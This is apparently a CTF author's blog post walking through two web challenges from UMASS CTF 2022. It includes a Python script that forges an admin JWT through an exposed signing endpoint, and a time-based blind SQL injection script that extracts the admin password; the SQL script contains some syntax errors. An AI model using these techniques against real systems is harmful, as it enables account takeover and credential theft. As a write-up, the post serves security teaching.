<!DOCTYPE html>
<html>
<link rel="stylesheet" href="../../resources/styles/dopestyle.css">

<head>
    <title>Jaquiez</title>
</head>

<body>
    <header>
        <nav class="navbar-all">
            <ul>
                <li><a href="/">Jaquiez</a></li>
                <li><a href="/Blog/">Blog</a></li>
                <li><a href="/Projects/">Projects</a></li>
                <li><a href="/Contact/">Contact</a></li>
            </ul>
        </nav>
    </header>
    <h1>
        UMASS CTF 2022 - April 2022
    </h1>

    <div id="post" style="display:table-cell; vertical-align:middle; text-align:center">
        <p>
            UMASS CTF was this past weekend and I authored three web challenges: <a href="#AutoFlag">AutoFlag</a>, <a
                href="#Venting">Venting</a>, and <a href="#umassdining">umassdining</a>.
        </p>
        <div id=AutoFlag>
            <h1 class="head">
                Autoflag
            </h1>
            <div>
                <p>
                    This challenge was based off a challenge that Akamai created for UMASS CTF. Originally, it was a jwt
                    token manipulation challenge that hinted at the secret token being "super-secret."
                    While this was an okay idea for a challenge, I decided to expand on the idea with some very basic
                    git foresnics and code review.
                    At the end of the competition it had 184 solves so I may have made it slightly easier than
                    anticipated. Below is my "official" writeup of the challenge.

                </p>

            </div>
            <img src="images/challenge1.png">
            <div>
                <p>
                    Upon opening the website we're greeted with the AutoFlag site giving us two buttons, one to get a
                    free flag and another to see the AutoFlag API.
                </p>
            </div>
            <img src="images/challenge1site.png" height="60%" width="60%">
            <div>
                <p>
                    Since everybody wants a free flag, let's just click that and get one!
                    This ends up with us getting redirected, and the site also makes some requests which we will inspect
                    later.
                </p>
            </div>
            <img src="images/challenge1redir.png" height="80%" width="80%">
            <div>
                <p>
                    After a few seconds, we are redirected to a page with a flag we don't want. A few more requests are
                    made so let's start looking at them. Also note, the file name is anonuserflag.png, this may hint
                    that there are other user flags to collect.
                </p>
            </div>
            <img src="images/dumbflag.png" height="70%" width="70%">
            <div>
                <p>
                    This first GET request we see is on /login where we see that a cookie is set.
                    This looks a lot like a JWT cookie, we can tell by the base64 "ey" which in ascii is "{"" aswell as
                    the three parts being seperated by dots.
                    So we know a JWT authentication is sent, this can be a possible vector of attack if we want to login
                    as another user.
                    Possible attacks you may be thinking of are a weak JWT secret or misconfiguration server side.

                </p>
            </div>
            <img src="images/request1.png" height="70%" width="70%">
            <div>
                <p>
                    Also in the request above we can see a javascript file is loaded called api.js.
                    We can open it up and see that in the source a comment is telling us that there is an 'admin' user
                    and we can see the
                    API source code changes on git. Interesting, let's check it out.
                </p>
            </div>
            <img src="images/scriptv2.png">
            <div>
                <p>
                    If we click the checkout the Autoflag API button on the main page we get a repository and see 4
                    commits.
                    One commit looks kind of interesting, let's click that.
                </p>
            </div>
            <img src="images/commits.png">
            <div>
                <p>
                    Checking out that commit we see a simple js script that created an unsigned token and signs it.
                    Tokens are signed by sending them in a post request to an "/api/sign-hmac" endpoint. Let's see if
                    this endpoint
                    is still open by sending a basic request to it.
                </p>
            </div>
            <img src="images/curl.png">
            <div>
                <p>
                    So putting this all together, we can sign any token with the secret on the server and we know
                    that there is a user called admin to impersonate. So we can change the user identity to admin
                    and authenticate on /flag. Here is my solve script below.
                </p>
            </div>
            <div style="text-align:left">
                <pre>
                    <code>
import base64
import json
import requests as r
r1 = r.get('http://34.148.103.218:4829/login')

val = r1.cookies.get('access_token_cookie')
val = str(val).split('.')

jwt_payload = base64.b64decode(val[1] + '==').decode('utf-8')
jwt_payload = json.loads(jwt_payload)
jwt_payload['sub'] = 'admin'
jwt_payload = json.dumps(jwt_payload)
jwt_payload = base64.b64encode(bytes(jwt_payload,'utf-8')).decode('utf-8').replace('=','')


payload = {"message":val[0] + '.' + jwt_payload}
r1 = r.post('http://34.148.103.218:4829/api/sign-hmac',data=payload)
token = val[0] + '.' + jwt_payload + '.' + r1.text.replace('=','')


headers = {
"Cookie":f"access_token_cookie={token}"
}
r1 = r.get('http://34.148.103.218:4829/flag',headers=headers)

print(r1.text)
                    </code>
                </pre>
                <code>UMASS{W0W_TH1$_1$_4_C00L_FL4G_BRUH!_69420}
                </code>
            </div>
            <div>
                <p>
                    In summary I think the challenge could have been made harder by obscuring some of the
                    code better in api.js such as making tokens with missing JTI claims and leaving them in the js.
                    This would probably force people to get their own unsigned token from /login, alter, and sign it.
                    However, this challenge was made 2 days before the competition (that's when Akamai sent it over) and
                    I'd say it is a solid improvement of what was previously given to us. Diclaimer: I had full consent
                    from Akamai to edit/revise the challenge as I saw fit.
                </p>
            </div>
        </div>
        <div id="Venting">
            <h1 class="head">
                Venting
            </h1>
            <div>
                <p>
                    The second challenge venting had less solves than AutoFlag yet more than most other challenges.
                    This challenge was made a few months before the CTF very quickly and not really touched again.
                    Out of these three first attempts at web challenges, this was the really the first challenge I made.
                    During the CTF this was hosted on one instance and sqlite3 only supports one connection at a time,
                    which on the first day caused some issues for players.
                </p>

            </div>
            <img src="images/challenge2.png">
            <div>
                <p>
                    So upon arrival we are given a form to fill out, none of the fields seem to be required though
                    so let's just click submit.
                </p>
            </div>
            <img src="images/sus.png">
            <div>
                <p>
                    When we check the sitemap after the initial request, we see several more redirects happen.
                    One of which has a redirect with some url paramaters including admin=False.
                </p>
            </div>
            <img src="images/sus2.png">
            <div>
                <p>
                    If we resend the request with URL paramters with admin=True, we are given a login screen.
                    When we press login we can see a POST request is sent with two form variables: user and pass.
                    When we send a basic response with user "admin" and any password, the response it "Invalid login".
                </p>
            </div>
            <img src="images/login.png">
            <div>
                <p>
                    From this we can assume that there is some sort of authentication bypass that we need to login as
                    admin.
                    A SQLi login bypass seems most likely and reading the html comments of the page also confirm that
                    sqlite3 is
                    running on the server to check requests. We can try a inject and we can see an error as well as the
                    full query being executed.
                    Aswell as our comments being replaced by some very sus unicode characters.
                </p>
            </div>
            <img src="images/sql.png">
            <div>
                <p>
                    Once we craft a successful payload without comments we can get a response from the admin
                    saying that there totally isn't anything in their password. If we want to take a look at it
                    regardless
                    we have to blindly enumerate through the user password. Some people used error based blind SQL
                    injections,
                    however my solution used a time based payload.
                    It ended up being a bit messy and slow even though I do a binary search
                    to lower the amount of requests I make, however it will eventually print the admin pass.
                </p>
            </div>
            <div style="text-align:left">
                <pre>
                    <code>

import requests as r;
import time;
target = input("Input target url below!\n")
payload= {
    user":"admin",
    "pass":"' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),1,1) is '1') THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1/0='a' END,'"
}
counter = 1
password = ""
low = 0
high = 128
lastval= 0
while(counter<50):
    value = (int)((low+high)/2);
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) > CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target+"/fff5bf676ba8796f0c51033403b35311/login",data=payload)
    if(r1.elapsed.total_seconds()>2):
        low = value
        value = (int)((low+high)/2)
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) < CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target+"fff5bf676ba8796f0c51033403b35311/login",data=payload)
    if(r1.elapsed.total_seconds()>2):
        high = value
        value = (int)((low+high)/2)
    payload["pass"]="' UNION SELECT CASE WHEN(SUBSTR ((SELECT password FROM users WHERE username is 'admin'),{index},1) is CHAR({value})) THEN (82=LIKE('TROLLED',UPPER(HEX(RANDOMBLOB(2000000000/2))))) ELSE 1 END,'".format(index=counter,value=value)
    r1 = r.post(target + "/fff5bf676ba8796f0c51033403b35311/login",data=payload)
    f(r1.elapsed.total_seconds()>2):  
        low = 0
        high = 128
        password = password + (chr)(value)
        counter = counter+1
        print(password)
                    </code>
                </pre>
            </div>
        <img src="images/script.png">
        <div>
            <p>
                Overall I think the challenge is okay. The main issue was challenge stability which could have
                been fixed by having multiple instances or at the very least multiple databases since there was only
                one single database connection allowed at once. In the future, I would probably try to include a full WAF
                with mulitple filters rather than just the password. For a first challenge, this is not too bad though.
            </p>
        </div>
        </div>
        <div id="umassdining">
            <h1 class="head">
                umassdining
            </h1>
        </div>
        </div>


</body>